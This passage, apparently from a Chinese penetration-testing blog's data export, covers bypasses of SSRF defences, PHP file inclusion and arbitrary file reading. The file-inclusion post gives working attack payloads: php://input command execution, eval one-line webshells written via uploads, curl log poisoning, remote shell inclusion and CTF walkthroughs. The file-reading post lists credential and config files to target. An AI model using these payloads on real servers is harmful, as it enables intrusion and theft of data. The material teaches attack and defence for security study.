无回显SSRF：不回显任何信息的SSRF。只能通过dnslog判断ssrf是否存在，无法用来探测内网，只能配合其他信息泄露来盲打内网。单独存在没有危害。 SSRF漏洞(防御&amp;绕过姿势)常见防御方法： 设置协议头的白名单或黑名单，过滤除了HTTP和HTTPS之外的所有协议头 设置URL的白名单或黑名单（比如百度翻译：不允许访问DNSlog和bbc） 设置访问IP的白名单或黑名单，过滤访问的IP（看需求） 限制请求的端口为http的常用端口，比如：80、443、8080等 后台代码对请求来源进行验证 统一错误信息，避免用户根据错误信息来判断远程服务器的端口状态 绕过方法： 参考：https://www.t00ls.com/articles-41070.html @ http://abc@127.0.0.1 实际上是以用户名abc连接到站点127.0.0.1。 在对@解析域名中，不同的处理函数存在处理差异，如：对于http://www.aaa.com@www.bbb.com@www.ccc.com，PHP的parse_url会识别为www.ccc.com，而libcurl则会识别为www.bbb.com。 利用[::] 可以利用[::]来绕过localhost。比如http://[::]:80/ &gt;&gt;&gt; http://127.0.0.1 句号 127。0。0。1 &gt;&gt;&gt; 127.0.0.1 添加端口号 比如：http://127.0.0.1:8080。 禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址。 绕过： 短网址绕过 站长工具短网址：http://tool.chinaz.com/tools/dwz.aspx 百度短网址：http://dwz.cn/ 利用特殊域名xip.io 原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1。 IP限制绕过 十进制转换 八进制转换 十六进制转换 不同进制组合转换 127.0.0.1 八进制：0177.0.0.1 十六进制：0x7f.0.0.1 十进制：2130706433 协议限制绕过 禁用不需要的协议(如：file:///、gopher://,dict://等)。仅仅允许http和https请求。 当url协议限定只为http(s)时，可以利用follow redirect 特性构造302跳转服务，使用https://tinyurl.com生成302跳转地址，再结合dict:// file:// gopher://构造攻击。 DNS重绑定可以利用于ssrf绕过 ，bypass 同源策略等，，，这里介绍三种方法 特定域名实现TTL&#x3D;0 域名绑定两条A记录 自建DNS服务器","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"文件包含","slug":"渗透测试/7. 文件包含","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:01:05.858Z","comments":true,"path":"posts/[object Object]/渗透测试/7. 文件包含/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/undefined","excerpt":"","text":"文件包含漏洞 原理文件包含： 文件包含即程序通过 包含函数 调用本地或远程文件，将文件内容作为脚本执行，以此来实现拓展功能。 程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。 文件包含漏洞原理: 文件包含漏洞是指当服务器php.ini文件中开启allow_url_include选项时，就可以通过PHP的某些特性函数，比如include()，require()和include_once()，require_once()，利用URL去动态包含文件，让当前页面去执行指定的另外一个文件中的代码内容。此时如果没有对文件来源进行严格审查，就会导致任意文件读取。黑客将很有可能让当前页面去执行超出 Web 目录中的文件，或者是 Web 目录中不希望被执行的敏感文件，甚至是远程服务器上的文件。 几乎所有的脚本语言中都提供文件包含的功能，但文件包含漏洞在 PHP 中居多，而在JSP、ASP、ASP.NET程序中非常少，甚至没有包含漏洞的存在。 1234567891011121314#文件包含各个脚本代码ASP,PHP,JSP,ASPX等&lt;!-—#include file=&quot;1.asp&quot; --&gt;&lt;!--#include file=&quot;top.aspx&quot;--&gt;&lt;c:import url=&quot;http://lthief.one/1.jsp&quot;&gt; // 远程文件包含&lt;jsp:include page=&quot;head.jsp&quot; / &gt;&lt;%@ include file=&quot;head.jsp&quot; %&gt;&lt;?php Include (&#x27;test.php&#x27;) ?&gt; 检测 白盒 代码审计 黑盒 漏洞扫描工具； 公开漏洞； 手工查看参数值和功能点（看是不是接收一个文件名作为参数，或者该功能的实现会不会涉及include()之类的函数）。 PHP中常见包含文件的函数include()当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。 12345678910111213&lt;?php$filename = $_GET[&#x27;filename&#x27;];include($filename);// http://127.0.0.1:8080/include.php?filename=index.txt/*$filename=$_GET[&#x27;filename&#x27;];include ( $filename.&quot; .html&quot; ); // 文件后缀名增加了一个HTML作为限制*/?&gt; 比如访问服务器本地1.txt的内容： include_once()功能与include()相同，区别在于当重复调用同一文件时，程序只调用一次。 require()require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。 require_once()功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次 分类本地文件包含被包含的文件在服务器本地。 利用条件： allow_url_include = On 比如，以get请求实施文件包含攻击，查看服务器本地文件：?page=a.php、?home=b.html 12345678910111213141516171819// windows serverc:\\boot.ini // 查看系统版本c:\\XX\\httpd.conf Apache配置信息c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini // MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码c:\\windows\\php.ini // php 配置信息// Linux/Unix/etc/passwd 账户信息/etc/shadow 账户密码文件/etc/httpd/conf/httpd.conf Apache配置文件/etc/my.conf mysql 配置文件/usr/local/app/apache2/conf/httpd.conf Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf 虚拟网站配置/usr/local/app/php5/lib/php.ini PHP相关配置 远程文件包含利用条件： allow_url_fopen = On 是否允许将URL（HTTP，HTTPS等）作为文件打开处理 allow_url_include = On 是否允许includeI()和require()函数包含URL（HTTP，HTTPS）作为文件解析处理 远程文件包含漏洞是因为开启了PHP配置中的allow_url_fopen选项，选项开启之后，服务器允许包含一个远程文件，服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。 比如使用 http://192.168.75.138/shell.php 来替换原 URL 中包含的文件名，可以远程执行 PHP 脚本。shell.php可以是一个一句话木马。 &#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;（重要）123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 各协议的利用条件和方法： 参考：https://www.cnblogs.com/endust/p/11804767.html file:&#x2F;&#x2F;php 涉及到文件以及协议的地方默认使用 file 协议，如果没有写出协议名或者协议不存在，都会被当成 file 协议来解析。 file://[文件的绝对路径和文件名] 不受allow_url_fopen、allow_url_include 开启的限制。 如：?a=file://C:/Windows/win.ini http:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;访问 HTTP(s) 网址、访问 FTP(s) URLs。允许通过 HTTP 1.0 的 GET方法，以 只读 访问文件或资源，通常用于远程包含。 需要allow_url_fopen &#x3D; On、allow_url_include &#x3D; On。 比如包含木马文件?a=http://vps.vps.vps.vps/shell.php 木马文件（shell.txt）内容：&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt; php:&#x2F;&#x2F;访问各个输入&#x2F;输出流（I&#x2F;O streams）。经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 包括php://stdin、php://stdout、php://stderr、php://input、php://output、php://filter、php://fd、php://memory、php://temp 九种。 php:&#x2F;&#x2F;input 访问请求的原始数据的只读流，将post请求的数据当作php代码 执行。注意enctype=“multipart/form-data” 的时候php://input是无效的。 需要allow_url_include &#x3D; On，但是不受 allow_url_fopen 影响。 123456789?page=php://input命令执行：POST:&lt;?php system(&#x27;ls&#x27;);?&gt;GetShell：POST:&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&#x27;shell&#x27;]) ?&gt;&#x27;);?&gt; php:&#x2F;&#x2F;filter 数据流打开时的筛选过滤应用，读取&#x2F;解析 本地源代码。 不受 allow_url_fopen、allow_url_include 影响。 用于读取文件（增加base64编码）： 12345?page=php://filter/read=convert.base64-encode/resource=index.php// 将php文件通过base64编码读出（&quot;read=&quot;可以省略），若不用base64编码，php文件就会作为脚本执行，无法输出源代码。?file=php://filter/read=convert.base64-encode/resource=flag.php//读取文件源码 用于解析（执行）文件，可用于getshell： 1234用于GetShell（shell.txt需通过文件上传在目标服务器上）：木马文件（shell.txt）内容：&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;然后菜刀连接 http://localhost/test.php?file=php://filter/resource=./1.txt 即可。 data:&#x2F;&#x2F;需要allow_url_fopen&#x3D;On，allow_url_include&#x3D;On。 将data:&#x2F;&#x2F;所指内容 执行。 1data://text/plain,待执行的文本内容 http://127.0.0.1:8080/include.php?filename=data://text/plain,&lt;?php%20phpinfo(); ?&gt; zip:&#x2F;&#x2F;压缩流，可以访问压缩文件中的子文件，将子文件的内容当做 php 代码 执行。 不受 allow_url_fopen、allow_url_include 影响。 12345?page=zip://D:/phpStudy/WWW/file.zip%23code.txt格式：zip://[压缩包绝对路径]#[压缩包内的子文件名]注：文件路径必须为绝对路径；zip文件后缀名可以改为其他如图片后缀；#进行url编码为%23 zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;压缩流，可以访问压缩文件中的子文件，将子文件的内容当做 php 代码 执行。 不受 allow_url_fopen、allow_url_include 影响。 12?page=compress.zlib://file.zip注：文件路径无绝对路径限制；zlib://协议文件压缩为zip或gz都可以，bzip2://协议文件压缩为bz2；后缀名也可以改为其他，如图片后缀 各种文件包含本地文件包含利用网站报错日志写入木马程序。 流程如下： 首先需要找到日志文件的存储位置 借助报错，往日志文件写木马 使用工具（菜刀或者蚁剑）连接 包含上传文件（先上传，后包含）假设已经上传一句话图片木马到服务器，路径为/upload/201811.jpg。 图片代码如下： 1&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;&quot;)?&gt; 然后访问URL：http://www.xxxx.com/index.php?page=./upload/201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php。 包含Apache日志文件WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。 前提是知道日志的物理存放路径。 日志默认路径 apache+Linux日志默认路径 12/etc/httpd/logs/access_log /var/log/httpd/access_log apache+win2003日志默认路径 12D:\\xampp\\apache\\logs\\access.logD:\\xampp\\apache\\logs\\error.log IIS6.0+win2003默认日志文件 1C:\\WINDOWS\\system32\\Logfiles IIS7.0+win2003 默认日志文件 1%SystemDrive%\\inetpub\\logs\\LogFiles nginx 日志文件 日志文件在用户安装目录logs目录下。以我的安装路径为例/usr/local/nginx，那我的日志目录就是在/usr/local/nginx/logs里。 web中间件默认配置 apache+linux 默认配置文件 12/etc/httpd/conf/httpd.confindex.php?page=/etc/init.d/httpd IIS6.0+win2003 配置文件 1C:/Windows/system32/inetsrv/metabase.xml IIS7.0+WIN 配置文件 1C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config curl 构造一句话，写入日志文件测试记录 1curl -v &quot;http://127.0.0.1/php/1.php?page=&lt;?php @eval($_POST\\[123\\]);?&gt;&quot;?page=&lt;?php @eval($_POST\\[123\\]);?&gt;&quot; 包含session可以先尝试包含到session文件，再根据session文件内容寻找可控变量，再构造payload插入到文件中，最后包含即可。 前提 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径： 12345/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSIDsession文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。 包含&#x2F;pros&#x2F;self&#x2F;environproc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。 利用条件： php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 12345678910111213- /proc/cpuinfo：CPU 的信息 (型号, 家族, 缓存大小等) - /proc/meminfo：物理内存、交换空间等的信息 - /proc/mounts：已加载的文件系统的列表 - /proc/devices：可用设备的列表 - /proc/filesystems：被支持的文件系统 - /proc/modules：已加载的模块 - /proc/version：内核版本 - /proc/[pid]/cmdline：系统启动时输入的内核命令行参数。- /proc/[pid]/cwd：通过cwd命令可以直接跳转到当前目录。- /proc/[pid]/environ：环境变量中可能存在secret_key，这时也可以通过environ进行读取。上述路径中的PID是需要填写的进程号，当然我们不知道，但这里我们可以用 **self** 来表示我们自己现在正在用的进程。 包含临时文件php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 如何获取临时文件的文件名： 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考。 防御黑名单（协议、路径限制）使用 str_replace() 函数把 http://、https://、../、..\\ 替换为了空值，来防止远程文件包含和相对路径的文件包含。 绕过：在 http:// 中再嵌套一个 http:// ，以及在 ../ 中多嵌套一个 ../，在 URL 中输入包含的文件名为 ..././..././phpinfo.php，则可以绕过限制；另外，也可以使用绝对路径的文件包含。 固定后缀使用include ( $filename.&quot; .html&quot; );之类的方式固定后缀。但是存在绕过。 绕过：各种截断：%00截断、路径长度截断、问号截断、#号截断、空格绕过等。 固定所要包含的文件不传参，直接写死include的文件。 绕过无限制文件包含无限制文件包含是指对于所包含的文件没有限制。无需绕过，可以直接进行文件包含攻击。 1234&lt;?php $filename = $_GET[&#x27;filename&#x27;]; include($filename);?&gt; 利用条件: 需要 allow_url_include=on http://127.0.0.1:8080/include.php?filename=../../www.txt 包含本地相对路径的文件。 http://127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt 包含在xiaohua.txt中的PHP代码通过远程文件包含被成功当成PHP代码解析。 有限制文件包含（需要绕过）有限制文件包含是指当代码中存在特定的前缀或者.php、.html等扩展名过滤时，攻击者 需要绕过前缀或者扩展名过滤，才能执行远程URL中恶意代码。 1234&lt;?php $filename = $_GET[&#x27;filename&#x27;]; include($filename.”.html”); // 在文件名后面强制增加html后缀?&gt; 包含文件失败： %00截断%00会被认为是结束符，后面的数据会被直接忽略，导致扩展名截断。 例如：http://127.0.0.1/test.php?filename=xiaohua.txt%00 利用条件： magic_quotes_gpc&#x3D;off PHP&lt;5.3.4 路径长度截断操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断。 利用条件 Windows下目录的最大路径256B Linux下目录的最大路径长度为4096B（根据服务器操作系统决定） 测试payload： 1http://127.0.0.1/include.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ 成功绕过，执行1.txt的内容&lt;?php echo phpinfo() ?&gt;。 点号截断点号截断适用于Windows系统，当点号的长度大于256B时，就可以造成扩展名截断。 问号绕过因为问号会分隔实际的 URL 和参数 http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt? ＃号绕过因为 # 表示书签 http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt%23 注意#要编码为%23 空格绕过http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt%20 注意空格要编码为%20 指定前缀绕过使用相对路径 ..&#x2F;..&#x2F; 来返回上一目录，被称为目录遍历(Path Traversal)。 例如 ?file=../../phpinfo/phpinfo.php 编码绕过服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。 实例某CMS程序文件包含利用-黑盒易酷CMS是一款影片播放CMS。该CMS2.5版本存在本地文件包含漏洞。我们可以利用这个漏洞，利用报错信息将一句话木马写入日志中。然后利用文件包含漏洞包含该日志文件，再用菜刀连接拿shell。 我们通过访问下面的url，将一句话木马写入日志文件中。由于文件包含时会自动将文件内容解析为php代码，所以下面的URL中并没有使用&lt;?php ?&gt;。该URL会发生报错： http://192.168.10.22/index.php?s=my/show/id/&#123;~eval($_POST[x])&#125; 然后就生成了相应的日志文件，文件存储有URL中的恶意代码： 该日志是以时间日期命名的，测试一句话木马： http://192.168.10.22/index.php?s=my/show/id/../temp/logs/20_08_14.log 用菜刀连接该日志文件，得到shell。 CTF-南邮大http://4.chinalover.sinaapp.com/web7/index.php 进入网站： 点击click me? no，发生跳转： 确定是否为文件包含 发现网站URL的参数名为file且接收一个文件名，判断可能考察文件包含。直接访问show.php看看： 与file=show.php显示是一样的，说明index.php?file=show.php存在文件包含。 尝试包含其他文件 尝试使用php:&#x2F;&#x2F;input进行文件包含攻击，执行恶意php代码： 执行失败，说明存在过滤，可能检测到了php之类的关键字，或者allow_url_include 不为on。 尝试使用不受allow_url_include限制的php://filter读取文件，判断是哪种情况： 发现读取成功，说明是allow_url_include 不为on。 把读取内容base64解码，找到flag。 i春秋web include百度杯真题进入题目链接： 网页给出了网站的php源码，发现存在文件包含。 尝试提交path参数，包含phpinfo.php，成功。 尝试包含index.php，成功。 发现存在index.php。改为index.phP，发现报错。 说明系统对大小写敏感，为linux系统，而且从报错信息来看也知道是linux。 进一步尝试使用php://input来包含恶意代码： 查看可疑文件，查看页面源代码，得到flag： 或者也可以使用php://filter读取该文件： 然后base64解码即可。","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"文件读取","slug":"渗透测试/9. 文件读取","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:01:17.336Z","comments":true,"path":"posts/[object Object]/渗透测试/9. 文件读取/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/undefined","excerpt":"","text":"文件读取 原理攻击者通过一些手段可以读取服务器上开发者不允许读到的文件。 主要读取的文件是服务器的各种配置文件、文件形式存储的密钥、服务器信息（包括正在执行的进程信息）、历史命令、网络信息、应用源码及二进制程序。 开发语言相关的触发点123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101phpinfo()功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。危险等级：中passthru()功能描述：允许执行一个外部程序并回显输出，类似于 exec()。危险等级：高exec()功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。危险等级：高system()功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。危险等级：高chroot()功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式PHP 时才能工作，且该函数不适用于 Windows 系统。危险等级：高scandir()功能描述：列出指定路径中的文件和目录。危险等级：中chgrp()功能描述：改变文件或目录所属的用户组。危险等级：高chown()功能描述：改变文件或目录的所有者。危险等级：高shell_exec()功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。危险等级：高proc_open()功能描述：执行一个命令并打开文件指针用于读取以及写入。危险等级：高proc_get_status()功能描述：获取使用 proc_open() 所打开进程的信息。危险等级：高error_log()功能描述：将错误信息发送到指定位置（文件）。安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，执行任意命令。危险等级：低ini_alter()功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。具体参见 ini_set()。危险等级：高ini_set()功能描述：可用于修改、设置 PHP 环境配置参数。危险等级：高ini_restore()功能描述：可用于恢复 PHP 环境配置参数到其初始值。危险等级：高dl()功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。危险等级：高pfsockopen()功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。危险等级：高syslog()功能描述：可调用 UNIX 系统的系统层 syslog() 函数。危险等级：中readlink()功能描述：返回符号连接指向的目标文件内容。危险等级：中symlink()功能描述：在 UNIX 系统中建立一个符号链接。危险等级：高popen()功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。危险等级：高stream_socket_server()功能描述：建立一个 Internet 或 UNIX 服务器连接。危险等级：中putenv()功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。危险等级：高禁用方法如下：打开/etc/php.ini文件，查找到 disable_functions ，添加需禁用的函数名，如下：phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen PHP 标准库函数：**file_get_contents()、file()、fopen()函数（及其文件指针操作函数fread()、fgets()**等） 与文件包含相关的函数（include()、require()、include_once()、require_once()等） 以及一些php:&#x2F;&#x2F;伪协议的使用：（参考文件包含） 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 通过PHP读文件的执行系统命令（**system()、exec()**等）。 拓展：php-curl扩展（文件内容作为HTTP body）涉及文件存取的库（如数据库相关扩展、图片相关扩展）、XML模块造成的XXE等。 # 为什么PHP还要还要用这些函数呢？ 现在PHP开发技术越来越倾向于单入口、多层级、多通道的模式，其中涉及PHP文件之间的调用密集且频繁。开发者为了写出一个高复用性的文件调用函数，就需要将一些动态的信息传入（如可变的部分文件名）那些函数，如果在程序入口处没有利用switch等分支语句对这些动态输入的数据加以控制，攻击者就很容易注入恶意的路径，从而实现任意文件读取甚至任意文件包含。 Wrapper 机制 PHP向用户提供的指定待打开文件的方式不是简简单单的一个路径，而是一个文件流。我们可以将其简单理解成PHP提供的一套协议。例如，在浏览器中输入http: &#x2F;&#x2F;host: port&#x2F;xxx后，就能通过HTTP请求到远程服务器上对应的文件，而在PHP中有很多功能不同但形式相似的协议，统称为Wrapper，其中最具特色的协议便是php:&#x2F;&#x2F;协议，更有趣的是，PHP提供了接口供开发者编写自定义的wrapper（stream_wrapper_register）。 Filter 机制 PHP中另一个具有特色的机制是Filter，其作用是对目前的Wrapper进行一定的处理（如把当前文件流的内容全部变为大写）。 对于自定义的Wrapper而言，Filter需要开发者通过stream_filter_register进行注册。 而PHP内置的一些Wrapper会自带一些Filter，如php:&#x2F;&#x2F;协议存在，所示类型的Filter。 PHP的Filter特性给我们进行任意文件读取提供了很多便利。 假设服务端include函数的路径参数可控，正常情况下它会将目标文件当作PHP文件去解析，如果解析的文件中存在“&lt;？php”等PHP的相关标签，那么标签中的内容会被作为PHP代码执行。比较常见的Base64相关的Filter可将文件流编码成Base64的形式，这样读取的文件内容中就不会存在PHP标签。而更严重的是，如果服务端开启了远程文件包含选项allow_url_include，我们就可以直接执行远程PHP代码。 Python漏洞经常出现在框架请求静态资源文件部分，也就是最后读取文件内容的open函数，但直接导致漏洞的成因往往是框架开发者忽略了Python函数的feature。 涉及文件操作的应用也因为滥用open函数、模板的不当渲染导致任意文件读取。如：将用户输入的某些数据作为文件名的一部分（常见于认证服务或者日志服务）存储在服务器中，在取文件内容的部分也通过将经过处理的用户输入数据作为索引去查找相关文件。攻击者构造软链接放入压缩包，解压后的内容会直接指向服务器相应文件，攻击者访问解压后的链接文件会返回链接指向文件的相应内容。 Python的模板注入、反序列化等漏洞都可造成一定程度的任意文件读取。 JavaJava本身的文件读取函数FileInputStream、XXE导致的文件读取。 Java的一些模块也支持file://协议，这是Java应用中出现任意文件读取最多的地方，如Spring Cloud Config Server路径穿越与任意文件读取漏洞（CVE-2019-3799）、Jenkins任意文件读取漏洞（CVE-2018-1999002）等。 RubyRuby的任意文件读取漏洞通常与Rails框架相关。到目前为止，我们已知的通用漏洞为Ruby On Rails远程代码执行漏洞（CVE-2016-0752）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2018-3760）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2019-5418）。笔者在CTF竞赛中就曾遇到Ruby On Rails远程代码执行漏洞（CVE-2016-0752）的利用。 NodeNode.js的express模块曾存在任意文件读取漏洞（CVE-2017-14849)。 CTF中Node的文件读取漏洞通常为模板注入、代码注入等情况。 中间件&#x2F;服务器相关触发点Nginx错误配置123Location /static&#123; Alias /home/myapp/static/;&#125; 如果配置文件中包含上面这段内容，很可能是运维或者开发人员想让用户可以访问static目录（一般是静态资源目录）。如果用户请求的Web路径是&#x2F;static…&#x2F;，拼接到alias上就变成了&#x2F;home&#x2F;myapp&#x2F;static&#x2F;…&#x2F;，此时便会产生目录穿越漏洞，并且穿越到了myapp目录。 数据库以mysql为例： MySQL的load_file()函数可以进行文件读取，但是load_file()函数读取文件首先需要数据库配置FILE权限（数据库root用户一般都有）。其次需要执行load_file()函数的MySQL用户&#x2F;用户组对于目标文件具有可读权限（很多配置文件都是所有组&#x2F;用户可读），主流Linux系统还需要Apparmor配置目录白名单（默认白名单限制在MySQL相关的目录下）。 软链接bash命令ln-s可以创建一个指向指定文件的软链接文件，然后将这个软链接文件上传至服务器，当我们再次请求访问这个链接文件时，实际上是请求在服务端它指向的文件。 FFmpeg参考一道题目：https://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html Docker-APIDocker-API可以控制Docker的行为，一般来说，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信。当我们遇见SSRF漏洞时，尤其是可以通过SSRF漏洞进行UNIX Socket通信的时候，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作），从而形成一种另类的任意文件读取。 文件读取的目标目录&#x2F;etc下的一些目录&#x2F;etc：&#x2F;etc目录下多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。 &#x2F;etc&#x2F;passwd：&#x2F;etc&#x2F;passwd文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户&#x2F;组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么。 &#x2F;etc&#x2F;shadow：&#x2F;etc&#x2F;shadow是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下，这个文件是不可读的。 &#x2F;etc&#x2F;apache2&#x2F;*：是Apache配置文件，可以获知Web目录、服务端口等信息。CTF有些题目需要参赛者确认Web路径。 &#x2F;etc&#x2F;nginx&#x2F;*：是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。 &#x2F;etc&#x2F;apparmor(.d)&#x2F;*：是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如，通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF（User Defined Functions）执行系统命令。 &#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)：定时任务文件。有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。 &#x2F;etc&#x2F;environment：是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。 &#x2F;etc&#x2F;hostname：表示主机名。 &#x2F;etc&#x2F;hosts：是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP&#x2F;域名。 &#x2F;etc&#x2F;issue：指明系统版本。 &#x2F;etc&#x2F;mysql&#x2F;*：是MySQL配置文件。 &#x2F;etc&#x2F;php&#x2F;*：是PHP配置文件。 &#x2F;proc目录&#x2F;proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟文件系统。&#x2F;proc 文件系统可以被用于收集有用的关于系统和运行中的内核的信息。 &#x2F;proc&#x2F;cpuinfo：CPU 的信息 (型号, 家族, 缓存大小等) &#x2F;proc&#x2F;meminfo：物理内存、交换空间等的信息 &#x2F;proc&#x2F;mounts：已加载的文件系统的列表 &#x2F;proc&#x2F;devices：可用设备的列表 &#x2F;proc&#x2F;filesystems：被支持的文件系统 &#x2F;proc&#x2F;modules：已加载的模块 &#x2F;proc&#x2F;version：内核版本 &#x2F;proc&#x2F;[pid]&#x2F;cmdline：系统启动时输入的内核命令行参数。 &#x2F;proc&#x2F;[pid]&#x2F;cwd：通过cwd命令可以直接跳转到当前目录。 &#x2F;proc&#x2F;[pid]&#x2F;environ：环境变量中可能存在secret_key，这时也可以通过environ进行读取。 上述路径中的PID是需要填写的进程号，当然我们不知道，但这里我们可以用 self 来表示我们自己现在正在用的进程。 其他目录 Nginx配置文件可能存在其他路径：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;* 日志文件：&#x2F;var&#x2F;log&#x2F;* Apache默认Web根目录：&#x2F;var&#x2F;www&#x2F;html PHP session目录：&#x2F;var&#x2F;lib&#x2F;php(5)&#x2F;sessions 可能泄露用户Session 用户目录：[user_dir_you_know]&#x2F;.bash_history 历史命令执行 [user_dir_you_know]&#x2F;.bashrc 